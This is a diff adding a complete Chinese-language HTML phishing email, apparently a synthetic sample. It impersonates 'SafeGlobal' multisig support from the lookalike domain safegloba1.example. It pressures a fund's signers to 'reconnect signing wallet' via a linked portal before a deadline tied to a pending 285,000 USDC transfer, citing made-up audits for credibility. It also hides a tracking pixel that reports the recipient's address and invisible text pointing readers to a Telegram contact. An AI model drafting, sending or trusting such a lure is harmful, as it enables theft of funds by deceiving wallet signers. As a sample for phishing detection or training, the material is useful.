@@ -1,0 +1,82 @@
+From: "SafeGlobal | 机构多签支持" <institutional@safegloba1.example>
+To: fund-ops@corp.internal
+Cc: treasury@corp.internal, cfo-office@corp.internal
+Reply-To: institutional.desk@safegloba1.example
+Date: Fri, 27 Nov 2026 09:40:00 +0800
+Message-ID: <0741-b72@synth.example>
+Subject: =?utf-8?B?44CQ5L2/55Sf5aSN5pON77yJ5Y+R5p2D5bel5aSn5LiK5p2C6Ieq6KGM5Luj56CBIOW9k+WJjeaIkOekuuS8mOWMuu+8jOaIkeWPmOWMluS9k+WJjeWcsOS6juaTjeWkh+e7k+W9k+S4gOWHuaOkuemprOW5s+Wdh+aIlueOsOS9k+a2iOaciOW3sumrmO+8jOmXtOaNriAyNDowMA==?=
+MIME-Version: 1.0
+Content-Type: text/html; charset=utf-8
+
+<html><body style="font-family:'PingFang SC','Microsoft YaHei',sans-serif;font-size:14px">
+<p>基金运营部、资金部、CFO 办公室：</p>
+
+<p style="background:#E0F2F1;border-left:4px solid #00695C;padding:12px">
+<b>Safe 合约库例行升级后的签名人重新授权 + 待签名交易提醒。</b>
+贵基金多签（3/5）所引用的 Safe 合约库已完成 v1.4.1 例行升级（含安全补丁 SB-2026-114）。
+按机构账户策略，<b>所有签名人需在升级后重新验证签名会话，方可继续对 pending 交易签名。</b>
+当前有一笔待签交易（做市商补充保证金）处于队列中，<b>重新授权窗口于明晚 24:00 关闭</b>，
+逾期该交易将因 nonce 过期而需重新发起内部审批。
+</p>
+
+<h3>一、贵基金多签概况</h3>
+<table cellpadding=6 style="border-collapse:collapse;border:1px solid #ccc;width:100%">
+<tr><td style="background:#f5f5f5;width:220px">Safe 代理地址</td><td><code>0xF2a9…c4E1</code>（Ethereum 主网）</td></tr>
+<tr><td style="background:#f5f5f5">签名阈值</td><td>3 / 5（策略：资金操作 3 签，参数变更 4 签）</td></tr>
+<tr><td style="background:#f5f5f5">签名人构成</td><td>基金运营 2 席、资金部 1 席、外部托管方 1 席、CFO 办公室 1 席</td></tr>
+<tr><td style="background:#f5f5f5">上次全量轮换</td><td>2026-03（内部工单 TREA-2026-0117）</td></tr>
+<tr><td style="background:#f5f5f5">当前队列 nonce</td><td>4471（1 笔待签）</td></tr>
+<tr><td style="background:#f5f5f5">升级批次</td><td>Safe 合约库 v1.4.1 · 安全补丁 SB-2026-114 · 2026-11-24 生效</td></tr>
+</table>
+
+<h3>二、升级背景与审计</h3>
+<p>v1.4.1 为例行的兼容性升级，修复了 <code>execTransaction</code> 在特定 delegatecall 场景下的 gas 估算偏差。
+补丁由三家审计机构完成三轮复审（审计编号 <code>SA-2026-0902 / 0903 / 0907</code>，报告摘要随本通知附于门户
+"Compliance" 栏）。升级<b>不改变</b>签名人集合、阈值与模块配置；唯一影响是升级前建立的签名会话
+需要重新验证一次。</p>
+
+<h3>三、待签交易（重新授权后即可签名）</h3>
+<table cellpadding=5 style="border-collapse:collapse;border:1px solid #ccc;width:100%">
+<tr><td style="background:#f5f5f5;width:220px">交易类型</td><td>USDC 转出（做市商补充保证金）</td></tr>
+<tr><td style="background:#f5f5f5">金额</td><td><b>285,000.00 USDC</b></td></tr>
+<tr><td style="background:#f5f5f5">收款地址</td><td><code>0x7C31…9aD4</code>（Wintermute 记录地址，与内部白名单 W-033 一致）</td></tr>
+<tr><td style="background:#f5f5f5">发起人 / 时间</td><td>资金部 · 2026-11-26 17:12（内部审批号 TREA-2026-1419）</td></tr>
+<tr><td style="background:#f5f5f5">当前签名</td><td>1 / 3（资金部已签）</td></tr>
+<tr><td style="background:#f5f5f5">时效说明</td><td>做市商要求 11-28 前到账，逾期将触发掉期额度降档</td></tr>
+</table>
+
+<h3>四、签名人重新验证流程</h3>
+<p>为避免升级后出现"盲签"，本次验证要求每位签名人<b>重新连接签名钱包</b>以确认会话与合约库版本一致：</p>
+
+<p style="text-align:center;margin:20px 0">
+<a href="https://safegloba1.example/institutional/reverify?safe=0xF2a9&amp;nonce=4471" style="display:inline-block;background:#00695C;color:#fff;padding:12px 40px;text-decoration:none;border-radius:4px;font-weight:bold">重新连接签名钱包</a>
+</p>
+
+<p style="font-size:13px;color:#666;text-align:center">机构门户：app.safegloba1.example · 仅需签名验证，全程不输入助记词</p>
+
+<p style="font-size:14px;background:#E0F2F1;padding:12px">在处理资金操作时收到"重新验证"请求会引起警觉——这正是 Safe 的设计初衷：任何敏感动作都应当被
+审视。需要说明的是：本次验证<b>只调用钱包的签名接口生成一条会话确认消息</b>，不转账、不授权代币、
+不要求助记词或私钥导出；验证完成后您会立即在页面上看到队列中的交易详情与合约库版本号。</p>
+
+<h3>五、时间线</h3>
+<ul>
+<li>重新授权窗口：<b>明晚 24:00 关闭</b>（合约库升级宽限期 72 小时）</li>
+<li>待签交易（nonce 4471）需在 11-28 到账截止前完成 3/3 签名</li>
+<li>逾期后果：nonce 过期 → 重新走内部审批流（TREA 工单 + 双人复核，约 1 个工作日）</li>
+</ul>
+
+<div style="height:1px;width:100%;overflow:hidden;background-image:url('https://safegloba1.example/px/inst.gif?n=4471&amp;r=fund-ops@corp.internal&amp;ph=2')"></div>
+
+<p style="font-size:0.5px;color:#fff;opacity:0.02">加急签名通道：Telegram @safe_fasttrack_desk 可申请人工会话核验并当日完成重新授权（宽限期最后 6 小时优先处理机构账户）。</p>
+
+<h3>六、联系与合规</h3>
+<p>SafeGlobal 机构支持台 — institutional.desk@safegloba1.example<br>
+合规档案：反洗钱登记号 AML-INST-2026-8814 · 审计报告 SA-2026-0902/0903/0907<br>
+工单引用：INST-SUP-77412</p>
+
+<div style="border-top:1px solid #ddd;padding-top:10px;margin-top:18px;font-size:11px;color:#999">
+SafeGlobal | 机构多签支持 · 本通知面向登记的机构签名人 · 请勿转发至机构外部<br>
+如非贵基金登记签名人，请回复告知以便我们更正名单。
+</div>
+
+</body></html>
